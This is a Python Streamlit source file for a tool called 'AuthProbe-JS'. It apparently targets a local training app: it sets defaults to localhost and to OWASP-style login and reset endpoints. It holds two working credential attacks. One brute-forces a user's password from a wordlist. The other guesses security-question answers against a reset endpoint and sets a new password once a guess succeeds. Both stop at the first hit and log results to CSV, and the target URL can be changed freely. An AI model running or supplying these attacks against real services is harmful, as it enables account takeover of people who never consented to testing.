import time, csv, json, requests, streamlit as st

st.set_page_config(page_title="AuthProbe-JS UI", page_icon="🔐", layout="wide")

# -------- helpers --------
def mk_session(burp: str | None):
    s = requests.Session()
    s.headers.update({"User-Agent": "AuthProbe-JS/1.0 (+lab)"})
    if burp:
        s.proxies = {"http": burp, "https": burp}
        s.verify = False  # lab-only; OK when proxying via Burp
    return s

def lines(text: str) -> list[str]:
    return [ln.strip() for ln in text.replace("\r\n","\n").split("\n") if ln.strip()]

def success_by_markers(resp: requests.Response, markers: list[str]) -> bool:
    if not markers:
        return resp.status_code in (200,201,202,204)
    body = ""
    try:
        if resp.headers.get("content-type","").lower().startswith("application/json"):
            body = json.dumps(resp.json(), ensure_ascii=False)
        else:
            body = resp.text
    except Exception:
        body = resp.text
    b = body.lower()
    return any(m.lower() in b for m in markers)

def write_csv(path: str, rows: list[tuple]):
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(["#", "payload", "status", "length", "note"])
        w.writerows(rows)

# -------- UI --------
st.title("🔐 AuthProbe-JS — Local Demo UI")

with st.sidebar:
    st.markdown("### Global")
    base = st.text_input("Base URL", "http://127.0.0.1:3000")
    use_burp = st.checkbox("Route traffic via Burp", value=False)
    burp = st.text_input("Burp proxy", "http://127.0.0.1:8080")
    timeout = st.number_input("Timeout (s)", 1.0, 60.0, 10.0, 0.5)
    delay = st.number_input("Delay between tries (s)", 0.0, 5.0, 0.1, 0.1)

tab1, tab2 = st.tabs(["A07: Login brute force", "KBA: Reset probe"])

# ---- Tab 1: Login brute force ----
with tab1:
    st.header("A07 — Identification & Authentication Failures")
    c1, c2 = st.columns(2)
    with c1:
        email = st.text_input("Email", "test1@example.com")
        wl_text = st.text_area("Passwords (one per line)", height=180, value="123456\npassword\nqwerty")
    with c2:
        markers = st.text_input("Success markers (comma separated)", "token,authentication,jwt")

    if st.button("Run brute force", type="primary"):
        s = mk_session(burp if use_burp else None)
        url = base.rstrip("/") + "/rest/user/login"
        pwds = lines(wl_text)
        if not pwds: st.error("Provide at least one password."); st.stop()

        prog = st.progress(0); log = st.empty(); table = st.empty()
        rows, hit = [], None
        for i, pw in enumerate(pwds, start=1):
            try:
                r = s.post(url, json={"email": email, "password": pw}, timeout=timeout)
                ok = success_by_markers(r, [m.strip() for m in markers.split(",") if m.strip()])
                note = "HIT" if ok else ""
                rows.append((i, pw, r.status_code, len(r.content), note))
                log.write(f"**{pw}** → {r.status_code} ({len(r.content)} bytes) {note}")
                table.dataframe(
                    [{"#":n,"password":p,"status":sc,"length":ln,"note":nt} for n,p,sc,ln,nt in rows],
                    use_container_width=True
                )
                if ok: hit = pw; break
            except Exception as e:
                rows.append((i, pw, "ERROR", 0, str(e))); log.error(f"{pw} → ERROR: {e}")
            prog.progress(i/len(pwds)); time.sleep(delay)

        write_csv("results_login.csv", rows)
        st.success(f"✅ HIT: {hit}") if hit else st.warning("[-] No success. See results_login.csv")

# ---- Tab 2: KBA reset probe ----
with tab2:
    st.header("Security Question / Reset Password probe")
    c1, c2 = st.columns(2)
    with c1:
        endpoint = st.text_input("Endpoint path (from Burp)", "/rest/user/reset-password")
        method = st.selectbox("Method", ["POST","PUT"], index=0)
        email_kba = st.text_input("Email (must exist)", "test1@example.com")
        answers_text = st.text_area("Answers (one per line)", height=180, value="blue\nred\ngreen")
        add_header = st.checkbox("Send X-User-Email header matching the email", value=True)
    with c2:
        st.caption("JSON template — use {EMAIL} and {ANSWER} placeholders")
        tpl_text = st.text_area("Template JSON", height=220, value='''{
  "email": "{EMAIL}",
  "answer": "{ANSWER}",
  "new": "12345",
  "repeat": "12345"
}''')
        markers2 = st.text_input("Success markers (comma separated)", "reset,new password,token,success")

    if st.button("Run KBA probe", type="primary"):
        s = mk_session(burp if use_burp else None)
        if add_header:
            s.headers.update({"X-User-Email": email_kba})
        url = base.rstrip("/") + endpoint
        answers = lines(answers_text)
        if not answers: st.error("Provide at least one answer."); st.stop()

        rows, hit = [], None
        prog = st.progress(0); log = st.empty(); table = st.empty()
        for i, a in enumerate(answers, start=1):
            try:
                body = tpl_text.replace("{EMAIL}", email_kba).replace("{ANSWER}", a)
                body_json = json.loads(body)  # catches invalid JSON
                r = s.post(url, json=body_json, timeout=timeout) if method=="POST" else s.put(url, json=body_json, timeout=timeout)
                ok = success_by_markers(r, [m.strip() for m in markers2.split(",") if m.strip()]) or r.status_code in (200,201,202,204)
                note = "HIT" if ok else ""
                rows.append((i, a, r.status_code, len(r.content), note))
                log.write(f"**{a}** → {r.status_code} ({len(r.content)} bytes) {note}")
                table.dataframe(
                    [{"#":n,"answer":p,"status":sc,"length":ln,"note":nt} for n,p,sc,ln,nt in rows],
                    use_container_width=True
                )
                if ok: hit = a; break
            except json.JSONDecodeError as je:
                rows.append((i, a, "TEMPLATE ERROR", 0, str(je))); log.error(f"TEMPLATE ERROR: {je}")
            except Exception as e:
                rows.append((i, a, "ERROR", 0, str(e))); log.error(f"{a} → ERROR: {e}")
            prog.progress(i/len(answers)); time.sleep(delay)

        write_csv("results_kba.csv", rows)
        st.success(f"✅ HIT: '{hit}'") if hit else st.warning("[-] No success. See results_kba.csv")
